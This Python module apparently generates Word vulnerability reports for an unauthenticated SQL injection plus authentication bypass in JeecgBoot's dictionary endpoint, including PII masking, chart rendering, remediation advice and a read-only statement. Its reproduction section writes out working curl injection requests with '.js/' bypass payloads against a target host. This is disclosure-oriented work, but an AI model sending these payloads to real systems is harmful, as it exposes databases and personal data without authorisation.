"""出证层：脱敏样例 → 统计图 → Word 报告（全部由探测记录驱动，不写死目标）。"""
import base64
import re as _re
import json
import os
import re

from docx import Document
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Mm, Pt, RGBColor

# ---------------- 脱敏 ----------------
def _strip(s):
    return re.sub(r"\s+", "", str(s or ""))


def mask(col, v):
    """按列类型打码：姓名留首尾各 1 字、手机前 3 后 4、邮箱留首字母+域名、其余只留长度。"""
    s = _strip(v)
    # 「袁心怡（外请）」这类带标注的姓名：先把括号里的标注去掉再打码，
    # 否则尾字会是「）」，打出来像打码失效
    if col and col.lower() in ("realname", "full_name", "name", "contact", "lender", "borrower"):
        s = re.sub(r"[（(][^）)]{0,12}[）)]", "", s).strip() or s
    if not s:
        return ""
    c = (col or "").lower()
    # 分类字段（Teacher/Student、男/女、启用/停用）不是人名也不是联系方式：
    # 打码会把「Teacher」遮成「T*****r」，既没保护价值又让人怀疑在藏东西
    if c in ("identity", "sex", "status", "type", "role", "category") and not re.search(r"\d{6,}", s):
        return s
    if c in ("phone", "mobile", "telephone") or "contact" in c or _re.search(r"(^|_)tel($|_)", c):
        d = re.sub(r"\D", "", s)
        if len(d) >= 8:
            return d[:3] + "****" + d[-4:]
        return s[0] + "*" * (len(s) - 2) + s[-1] if len(s) >= 3 else "*" * max(len(s), 1)
    if c == "email":
        if "@" in s:
            u, dom = s.split("@", 1)
            return (u[0] + "***@" + dom) if u else "***@" + dom
        return s[0] + "*" * (len(s) - 1)
    if c in ("idcard", "id_card", "sfzh", "id_number"):
        return s[:4] + "*" * max(len(s) - 6, 1) + s[-2:]
    if len(s) <= 1:
        return "*"
    if len(s) == 2:
        return s[0] + "*"
    return s[0] + "*" * (len(s) - 2) + s[-1]


def masked_samples(rec, per_field=5):
    out = {}
    for f in rec.get("fields") or []:
        if not f.get("pii"):
            continue
        vals = [v for v in (f.get("values") or []) if str(v or "").strip()]
        out[f["table"] + "." + f["col"]] = [mask(f["col"], v) for v in vals[:per_field]]
    rec_for_disk = {k: v for k, v in rec.items() if k != "fields"}
    rec_for_disk["fields"] = [{k: v for k, v in f.items() if k != "values"} for f in rec.get("fields") or []]
    return out, rec_for_disk


# ---------------- HTML → PNG ----------------
CSS = """<style>
 body{font-family:"Microsoft YaHei","Noto Sans CJK SC","Droid Sans Fallback",sans-serif;
      background:#fff;color:#1b1f24;margin:0;padding:26px 30px;width:1080px}
 h1{font-size:20px;margin:0 0 4px}.sub{font-size:12.5px;color:#5a6472;margin-bottom:14px}
 table{border-collapse:collapse;width:100%;font-size:13px;margin-bottom:12px}
 th,td{border:1px solid #c9d1dc;padding:5px 8px;text-align:left}
 th{background:#eef2f7}.n{text-align:right;font-variant-numeric:tabular-nums}
 tr.hit td{background:#fff8e6}.note{font-size:12px;color:#5a6472;line-height:1.6}
 code{background:#f2f4f7;padding:1px 4px;border-radius:3px}
</style>"""


def _shot(html, path, width=1140):
    from playwright.sync_api import sync_playwright
    with sync_playwright() as pw:
        b = pw.chromium.launch(args=["--no-sandbox", "--disable-dev-shm-usage"])
        pg = b.new_page(viewport={"width": width, "height": 900}, device_scale_factor=2)
        pg.set_content(html, wait_until="load")
        pg.wait_for_timeout(250)
        pg.screenshot(path=path, full_page=True)
        b.close()
    return path


def render_images(rec, samples, evdir):
    host = rec["host"].replace("https://", "").replace("http://", "")
    rows = []
    for f in rec.get("fields") or []:
        rows.append(f"<tr><td>{f['table']}</td><td>{f['col']}</td><td>{f.get('label','')}</td>"
                    f"<td class='n'>{f.get('code')}</td><td class='n'>{f.get('bytes')}</td>"
                    f"<td class='n'>{f.get('rows')}</td><td class='n'>{f.get('nonempty')}</td></tr>")
    negs = []
    for n in rec.get("negatives") or []:
        negs.append(f"<tr class='hit'><td>{n['probe']}</td><td class='n'>{n.get('code')}</td>"
                    f"<td class='n'>{n.get('bytes')}</td><td>{n.get('why','')}</td></tr>")
    html = f"""{CSS}
<h1>{rec.get('title') or 'JeecgBoot'} —— 未授权读取范围统计</h1>
<div class="sub">目标 {rec['host']}{rec.get('prefix','')} ｜ 全部请求未带 Cookie / Token ｜ 统计时刻 {rec['ts']}</div>
<table><tr><th>数据表</th><th>字段</th><th>含义</th><th>HTTP</th><th>响应字节</th><th>返回行数</th><th>有值条数</th></tr>
{''.join(rows)}</table>
<div class="note">「返回行数」＝ SQL 条件命中行数；「有值条数」＝ 其中字段实际非空的条数（空串不算有值，两者必须分开写）。<br>
全部为只读 GET，未写入、未导出、未保存任何一条具体值。</div>
<h1 style="margin-top:20px">反例（证明不是「万能返回」）</h1>
<table><tr><th>请求</th><th>HTTP</th><th>响应字节</th><th>结果</th></tr>{''.join(negs)}</table>
"""
    p1 = _shot(html, os.path.join(evdir, "11-字段统计.png"))

    blocks = []
    for key, vals in samples.items():
        table, col = key.split(".", 1)
        body = "".join(f"<tr><td>{table}</td><td>{col}</td><td>{v}</td></tr>" for v in vals)
        blocks.append(body)
    html2 = f"""{CSS}
<h1>脱敏样例（原始值未落盘、未导出）</h1>
<div class="sub">{host} ｜ 采集时刻 {rec['ts']}</div>
<table><tr><th>数据表</th><th>字段</th><th>打码样例</th></tr>{''.join(blocks)}</table>
<div class="note">遮罩规则：姓名保留首尾各 1 字；手机保留前 3 后 4；短号（内线/分机）保留首尾；邮箱保留首字母与域名；证件号保留前 4 后 2；<br>
身份、性别、状态这类分类字段不含个人标识，原样保留（把 Teacher 遮成 T*****r 既无保护意义，反而让人怀疑在隐藏内容）。<br>
打码位置即原始值所在，保留的位数本身可证明「这确实是 11 位手机号 / 校内邮箱」。</div>
"""
    p2 = _shot(html2, os.path.join(evdir, "12-脱敏样例.png"))
    return {"stats": p1, "samples": p2}


# ---------------- docx ----------------
def _zh(style, latin="Times New Roman", ea="宋体", size=10.5, bold=None, color=None):
    style.font.name = latin
    style.font.size = Pt(size)
    if bold is not None:
        style.font.bold = bold
    if color is not None:
        style.font.color.rgb = color
    style.element.get_or_add_rPr().get_or_add_rFonts().set(qn("w:eastAsia"), ea)


class Doc:
    def __init__(self):
        self.d = Document()
        _zh(self.d.styles["Normal"])
        self.d.styles["Normal"].paragraph_format.line_spacing = 1.45
        self.d.styles["Normal"].paragraph_format.space_after = Pt(4)
        _zh(self.d.styles["Heading 1"], ea="黑体", size=16, bold=True, color=RGBColor(0x1F, 0x2A, 0x37))
        _zh(self.d.styles["Heading 2"], ea="黑体", size=13, bold=True, color=RGBColor(0x1F, 0x2A, 0x37))
        _zh(self.d.styles["Heading 3"], ea="黑体", size=11.5, bold=True, color=RGBColor(0x1F, 0x2A, 0x37))
        for s in ("Heading 1", "Heading 2", "Heading 3"):
            self.d.styles[s].paragraph_format.space_before = Pt(12)
            self.d.styles[s].paragraph_format.space_after = Pt(6)
        sec = self.d.sections[0]
        sec.top_margin, sec.bottom_margin = Mm(24), Mm(22)
        sec.left_margin, sec.right_margin = Mm(25), Mm(25)
        self.sec = sec
        self._footer()

    def _footer(self):
        p = self.sec.footer.paragraphs[0]
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        r1 = p.add_run("— ")
        r = p.add_run()
        fld = OxmlElement("w:fldSimple")
        fld.set(qn("w:instr"), "PAGE")
        r._element.addnext(fld)
        r2 = p.add_run(" —")
        for rr in (r1, r2):
            rr.font.size = Pt(9)
            rr.font.color.rgb = RGBColor(0x66, 0x6C, 0x77)

    def h(self, text, lvl=2):
        return self.d.add_heading(text, level=lvl)

    def p(self, text="", bold=False, size=10.5, italic=False, center=False):
        par = self.d.add_paragraph()
        if center:
            par.alignment = WD_ALIGN_PARAGRAPH.CENTER
        if text:
            r = par.add_run(text)
            r.bold, r.italic = bold, italic
            r.font.size = Pt(size)
        return par

    def code(self, lines):
        for ln in lines:
            par = self.d.add_paragraph()
            par.paragraph_format.space_after = Pt(0)
            par.paragraph_format.left_indent = Mm(4)
            r = par.add_run(ln)
            r.font.name = "Consolas"
            r.font.size = Pt(8.5)
            r._element.rPr.rFonts.set(qn("w:eastAsia"), "宋体")

    def img(self, path, width_mm, caption):
        par = self.d.add_paragraph()
        par.alignment = WD_ALIGN_PARAGRAPH.CENTER
        par.paragraph_format.space_before = Pt(6)
        par.paragraph_format.space_after = Pt(2)
        par.add_run().add_picture(path, width=Mm(width_mm))
        c = self.d.add_paragraph()
        c.alignment = WD_ALIGN_PARAGRAPH.CENTER
        c.paragraph_format.space_after = Pt(10)
        r = c.add_run(caption)
        r.font.size = Pt(9)
        r.font.color.rgb = RGBColor(0x44, 0x4A, 0x55)

    def table(self, rows, widths=None, size=9.5):
        t = self.d.add_table(rows=len(rows), cols=len(rows[0]))
        t.style = "Table Grid"
        t.alignment = WD_TABLE_ALIGNMENT.CENTER
        t.autofit = False
        layout = OxmlElement("w:tblLayout")
        layout.set(qn("w:type"), "fixed")
        t._tbl.tblPr.append(layout)
        for i, row in enumerate(rows):
            for j, val in enumerate(row):
                cell = t.cell(i, j)
                cell.text = ""
                par = cell.paragraphs[0]
                par.paragraph_format.space_after = Pt(1)
                r = par.add_run(str(val))
                r.font.size = Pt(size)
                if i == 0:
                    r.bold = True
                    shd = OxmlElement("w:shd")
                    shd.set(qn("w:val"), "clear")
                    shd.set(qn("w:fill"), "EDF1F6")
                    cell._tc.get_or_add_tcPr().append(shd)
        if widths:
            for j, w in enumerate(widths):
                t.columns[j].width = Mm(w)
                for i in range(len(rows)):
                    t.cell(i, j).width = Mm(w)
        self.d.add_paragraph().paragraph_format.space_after = Pt(2)
        return t

    def bullets(self, items):
        for s in items:
            par = self.d.add_paragraph(style="List Number")
            par.paragraph_format.space_after = Pt(3)
            par.add_run(s).font.size = Pt(10.5)

    def save(self, path):
        self.d.save(path)
        return path


def build_docx(rec, verdict, samples, evdir, out_path, images):
    host = rec["host"].replace("https://", "").replace("http://", "")
    title = rec.get("title") or "JeecgBoot 部署"
    doc = Doc()
    h = doc.h(f"{host}「{title}」", 1)
    h.paragraph_format.space_after = Pt(0)
    h2 = doc.h("未授权 SQL 注入：未认证可读取数据库任意表", 1)
    h2.paragraph_format.space_before = Pt(0)
    doc.p(verdict["reason"] + "；全程未登录、未使用凭据、未写入任何数据。", bold=True, size=11)
    doc.p(f"报告时间：{rec['ts']}　　测试方式：只读 HTTP 请求（GET）　　自动流水线：jeecg_autopilot", size=9.5)

    doc.h("一、漏洞概述")
    doc.p("字典查询接口 /sys/dict/getDictItems 存在两处缺陷并叠加成链：① Shiro 把以 .js 结尾的路径当静态资源"
          "匿名放行，而 Spring MVC 的 @PathVariable 仍把路径末段并入 dictCode、路由到业务控制器；"
          "② 该参数为四段式 table,text,code,filterSql，第四段被原样拼进 SQL 的 WHERE。"
          "两者叠加后，一条 GET 请求即可对数据库执行任意 SELECT。")
    doc.table([
        ["项", "内容"],
        ["目标", rec["host"]],
        ["系统名", title],
        ["API 前缀", rec.get("prefix") or "-"],
        ["产品", "JeecgBoot（字典接口四段式 dictCode）"],
        ["位置", f"GET {rec.get('prefix','')}/sys/dict/getDictItems/{{table}},{{text}},{{code}},{{filterSql}}-- .js/"],
        ["类型", "SQL 注入（CWE-89）＋ 授权缺失（CWE-306）＋ 个人信息泄露（CWE-200）"],
        ["前置条件", "无。不需要账号、Cookie、Token、验证码、自定义请求头"],
        ["初判等级", f"{verdict['level']}（{verdict['reason']}）"],
    ], widths=[26, 132])

    doc.h("二、漏洞原理")
    doc.p("① 认证绕过：ShiroConfig 中 /**/*.js 等静态资源规则为 anon，@PathVariable 又把末段 .js 吃进参数 —— "
          "两个框架对同一 URL 的理解不同，被放行的静态资源路径实际进了业务控制器。部分实例的 nginx 还会"
          "直接 404 掉 .js 形态，需要在末尾再补一个 /（即 .js/）才转发到应用。")
    doc.p("② 注入：dictCode 前两段有字符白名单，第四段 filterSql 直接拼进 SQL（${filterSql}）；"
          "因末段被追加 .js/，payload 用「-- 」（两横线加空格）注释掉尾巴。")
    doc.p("③ 布尔差分：本实例若 1=1 / 1=2 同码同长度，说明数字条件未被求值，改用 col is not null / is null；"
          "同时必须设不存在的表作反向对照，三组齐全才判注入成立。")

    doc.h("三、复现过程")
    doc.p("以下请求全部为 GET，不带 Cookie、Authorization 或任何自定义请求头。")
    pre = rec.get("prefix") or ""
    doc.code([
        f"# 1. 取 API 前缀",
        f"curl -s {rec['host']}/_app.config.js",
        f"#   → VITE_GLOB_API_URL=\"{pre}\"",
        "",
        "# 2. 认证绕过：401 → 404 → 200（.js 后必须再加 /）",
        f"curl -s -o /dev/null -w '%{{http_code}}\\n' '{rec['host']}{pre}/sys/dict/getDictItems/x,y,z'",
        f"curl -s -o /dev/null -w '%{{http_code}}\\n' '{rec['host']}{pre}/sys/dict/getDictItems/x,y,z.js'",
        f"curl -s -o /dev/null -w '%{{http_code}}\\n' '{rec['host']}{pre}/sys/dict/getDictItems/x,y,z.js/'",
        "",
        "# 3. 布尔差分（真 / 假 / 反向对照）",
        f"curl -s '{rec['host']}{pre}/sys/dict/getDictItems/sys_dict,dict_name,id,dict_code%20is%20not%20null--%20.js/'",
        f"curl -s '{rec['host']}{pre}/sys/dict/getDictItems/sys_dict,dict_name,id,dict_code%20is%20null--%20.js/'",
        f"curl -s '{rec['host']}{pre}/sys/dict/getDictItems/zzz_no_such_table,name,id,1=1--%20.js/'",
    ])
    bl = rec.get("bypass") or {}
    doc.p(f"实测：不带 .js → {(bl.get('raw') or {}).get('code')}；带 .js → {(bl.get('js') or {}).get('code')}；"
          f"带 .js/ → {(bl.get('jsslash') or {}).get('code')}（{bl.get('jsslash', {}).get('size')} 字节）。", size=10)

    doc.h("四、证据与对照表")
    doc.p(f"采集时刻 {rec['ts']}，提交前应重跑一次复验。体积为响应字节数（未使用 --compressed）。")
    d = rec.get("diff") or {}

    def drow(k, label):
        x = d.get(k) or {}
        return [label, str(x.get("code")), str(x.get("size")), str(x.get("rows")), str(x.get("msg") or "")[:28]]

    doc.table([
        ["请求", "HTTP", "字节", "行数", "服务端消息"],
        drow("true", "dict_code is not null（真）"),
        drow("false", "dict_code is null（假）"),
        drow("ctl", "zzz_no_such_table（对照）"),
    ], widths=[56, 14, 18, 14, 58], size=9)

    doc.img(images["stats"], 150, "图 1　逐字段统计（返回行数 / 有值条数）与反例，说明注入确实落到 SQL 层")
    if samples:
        doc.img(images["samples"], 150, "图 2　脱敏样例：打码位置即原始值所在，原始值未落盘")

    doc.h("五、危害与数据范围")
    pii = rec.get("pii_fields") or []
    rows = [["数据表", "字段", "含义", "有值条数"]]
    for f in pii:
        rows.append([f["table"], f["col"], f.get("label", ""), str(f.get("nonempty"))])
    if len(rows) == 1:
        rows.append(["-", "-", "未取到个人信息字段", "0"])
    doc.table(rows, widths=[46, 34, 40, 30], size=9)
    total = sum(f.get("nonempty") or 0 for f in pii)
    per_table = {}
    for f in pii:
        slot = per_table.setdefault(f["table"], {"rows": 0, "items": []})
        slot["rows"] = max(slot["rows"], f.get("rows") or 0)
        slot["items"].append((f.get("label") or f["col"], f.get("nonempty") or 0))
    parts = []
    for tbl, slot in per_table.items():
        detail = "、".join(f"{lab} {n} 条" for lab, n in slot["items"])
        parts.append(f"{tbl} 可读覆盖 {slot['rows']} 行（{detail}）")
    if parts:
        doc.p("按表统计：" + "；".join(parts) + "。")
    doc.p(f"上表各字段的有值条数相加为 {total} 条，这是字段级合计：同一个人若有姓名、邮箱、手机号三项，"
          "会被分别计入三次，因此不能当作人数来读。受影响的记录规模以上面按表统计的「可读覆盖行数」为准：该数"
          "是该表各字段行数的最大值，只能当下限；表的总行数可能更大，字典接口无法直接统计非字符串主键。")

    biz = rec.get("biz_fields") or []
    if biz:
        doc.h("业务数据（非个人信息）", 3)
        doc.p("以下列命中业务表但表名不属人相关语义，或列名本身不在个人信息口径内，仅证明可读业务数据，不纳入个人信息计数。")
        brows = [["数据表", "字段", "含义", "有值条数"]]
        for f in biz:
            brows.append([f["table"], f["col"], f.get("label", ""), str(f.get("nonempty"))])
        doc.table(brows, widths=[46, 34, 40, 30], size=9)

    doc.p("未获取到的内容（实测排除）：", bold=False)
    for n in rec.get("negatives") or []:
        doc.p(f"· {n['probe']} → HTTP {n.get('code')}，{n.get('bytes')} 字节，{n.get('why','')}", size=10)
    if verdict["level"] == "高危":
        tail = "；未取到口令哈希、无写权限，但证件号属敏感个人信息，敏感级别本身已足以定为高危。"
    else:
        tail = "；未取到口令哈希、无写权限，按披露口径不往高危推。"
    doc.p(f"定级理由：{verdict['level']}。{verdict['reason']}{tail}", size=10)

    doc.h("六、修复建议")
    doc.bullets([
        "对 dictCode 的 filterSql 段做结构化校验（jsqlparser 解析后只允许简单比较条件），禁止注释符与子查询；",
        "Shiro 静态资源改为按目录精确放行，删除 /**/*.js 一类后缀通配规则；",
        "升级 JeecgBoot 至 3.9.5 及以上（官方在该版本收紧了字典接口的 SQL 校验）；",
        "后台不应直接暴露公网，前置统一身份认证网关或限制来源网段；",
        "排查访问日志中形如 /sys/dict/getDictItems/*.js/ 的历史请求。",
    ])

    doc.h("七、有效性声明")
    doc.bullets([
        "全程只读：只发送 GET 请求，未写入、未上传、未改配置。",
        "未使用任何账号、Cookie 或凭据，未尝试登录或爆破。",
        "未导出、未落盘任何一条明文个人信息；报告中的样例一律打码（姓名首尾各 1 字、手机前 3 后 4、邮箱首字母+域名）。",
        "条数来自单次请求返回数组长度与逐列非空计数，可与第三节请求逐条复核。",
        "未获取到的内容已在第五节逐项列出，作为克制与边界的自证。",
    ])
    return doc.save(out_path)
